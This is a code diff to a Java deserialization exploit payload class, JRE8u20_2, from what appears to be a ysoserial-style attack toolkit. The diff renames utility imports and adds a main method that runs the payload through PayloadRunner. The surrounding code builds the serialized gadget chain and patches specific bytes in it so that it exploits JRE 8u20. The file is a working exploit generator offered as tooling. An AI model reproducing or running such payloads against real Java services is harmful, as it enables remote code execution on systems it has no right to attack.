@@ -1,12 +1,13 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import javassist.CtClass;
 import javassist.CtMethod;
 import A.R.ysogate.Serializer;
 import A.R.ysogate.payloads.ObjectPayload;
-import A.R.ysogate.payloads.util.ByteUtil;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.ByteUtils;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import javax.xml.transform.Templates;
 import java.beans.beancontext.BeanContextSupport;
@@ -67,9 +68,9 @@ public class JRE8u20_2 implements ObjectPayload<Object> {
 
 		byte[] shoudReplace = new byte[]{0x78, 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78, 0x71};
 
-		int i = ByteUtil.getSubarrayIndex(ser, shoudReplace);
-		ser = ByteUtil.deleteAt(ser, i); // delete 0x78
-		ser = ByteUtil.deleteAt(ser, i); // delete 0x70
+		int i = ByteUtils.getSubarrayIndex(ser, shoudReplace);
+		ser = ByteUtils.deleteAt(ser, i); // delete 0x78
+		ser = ByteUtils.deleteAt(ser, i); // delete 0x70
 
 		ByteArrayOutputStream baos = new ByteArrayOutputStream();
 		baos.write(ser);
@@ -77,5 +78,9 @@ public class JRE8u20_2 implements ObjectPayload<Object> {
 		System.out.println(baos);
 		System.exit(0);
 		return ser;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(JRE8u20_2.class, args);
 	}
 }
